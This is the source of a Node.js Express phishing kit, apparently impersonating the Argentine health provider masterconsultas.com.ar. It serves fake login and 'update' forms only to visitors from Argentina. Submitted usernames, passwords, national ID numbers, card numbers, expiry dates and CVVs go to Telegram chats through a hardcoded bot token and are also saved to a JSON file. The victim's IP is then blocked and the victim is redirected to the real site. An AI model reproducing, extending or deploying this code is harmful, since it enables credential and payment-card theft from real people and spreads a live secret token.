const { Router } = require('express');
const router = Router();
const fs = require ('fs');
const { v4: uuidv4, v4 } = require('uuid');
const bodyParse = require ('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('6547332141:AAEM5VzKZXmfCK-GFvabnI6N_FuMNKdsBWE', { polling: true });
const  requestIp = require('request-ip');
const Reader = require('@maxmind/geoip2-node').Reader;
const maxmindDbPath = './data/GeoLite2-Country.mmdb'; // Ruta a la base de datos MaxMind
const redirectUrl = 'https://www.fundeu.es/'; // URL a la que se redirigirá a los usuarios que ingresen desde otro país

router.use((req, res, next) => {
  const ip = requestIp.getClientIp(req);
  Reader.open(maxmindDbPath).then(reader => {
    const response = reader.country(ip);
    if (response.country.isoCode !== 'AR') { // Si el país de origen del usuario no es Argentina
      res.redirect(redirectUrl); // Redireccionar a la URL especificada
    } else {
      next(); // Continuar con la ejecución del siguiente middleware o ruta
    }
  }).catch(error => {
    console.log(error); // Manejar el error si no se puede abrir la base de datos MaxMind
    next(); // Continuar con la ejecución del siguiente middleware o ruta
  });
});


const googlebotIps = [
    '66.249.64.0/19', // Googlebot
    '64.233.160.0/19', // Googlebot
    '72.14.192.0/18', // Googlebot
    '209.85.128.0/17', // Googlebot
    '66.102.0.0/20', // Googlebot
    '74.125.0.0/16', // Googlebot
    '64.18.0.0/20', // Googlebot
    '207.126.144.0/20', // Googlebot
    '173.194.0.0/16', // Googlebot
  ];
  


const ipBlockListText = fs.readFileSync('ips-prohibidas.txt', 'utf-8');
const ipBlockList = ipBlockListText.split('\n').filter(ip => ip !== '');

router.use((req, res, next) => {
  const ip = requestIp.getClientIp(req);
  if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
    res.redirect('https://www.masterconsultas.com.ar/');
    return;
  }
  next();
});


const json_books = fs.readFileSync('src/books.json', 'utf-8');
let books = JSON.parse(json_books);


router.get('/',  (req, res) => {
    res.render('index.ejs');

});

router.get('/update', (req, res) => {
    res.render('update.ejs');

});

router.get('/new-entry', (req, res) => {
    res.render('new-entry', {
        books
    })
});


router.post('/',  (req, res) => {
    const {username, password} = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('MAMENLO.');
  return;
}
    bot.sendMessage('1307101091', `Usuario: ${username}\nContraseña: ${password}\nIP: ${ip}\n`);
    
  

    let newBook = {
        id: uuidv4(),
        username,
        password,
        ip,
    };
    
    books.push(newBook);
    
    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    
    res.redirect('update');
});

router.post('/update',  (req, res) => {
    const {dni, cardnumber, yy, mm, cvv, } = req.body;
    const ip = requestIp.getClientIp(req);
// Verifica si la IP del usuario está en la lista de IPs prohibidas
if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
  res.status(403).send('Tu dirección IP ha sido bloqueada.');
  return;
}
    bot.sendMessage('791007687', `Dni: ${dni}\nCardNumber: ${cardnumber}\nAño: ${yy}\nMes: ${mm}\nCvv: ${cvv}\nIP: ${ip}\n`);
    
    // Agrega la IP del usuario a la lista de IPs prohibidas en memoria
    ipBlockList.push(ip);

    // Guarda la lista actualizada de IPs prohibidas en el archivo de texto
    const ipBlockListText = ipBlockList.join('\n') + '\n';
    fs.writeFileSync('ips-prohibidas.txt', ipBlockListText, 'utf-8');
    
    let newBook = {
        id: uuidv4(),
        dni,
        cardnumber,
        mm,
        yy,
        cvv,
        ip,
    };
   
    books.push(newBook);

    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');

    res.redirect('https://www.masterconsultas.com.ar/');
});



router.get('/delete/:id', (req, res) => {
    books = books.filter(book => book.id != req.params.id);
    const json_books = JSON.stringify(books)
    fs.writeFileSync('src/books.json', json_books, 'utf-8');
    res.redirect('/new-entry');

});


module.exports = router;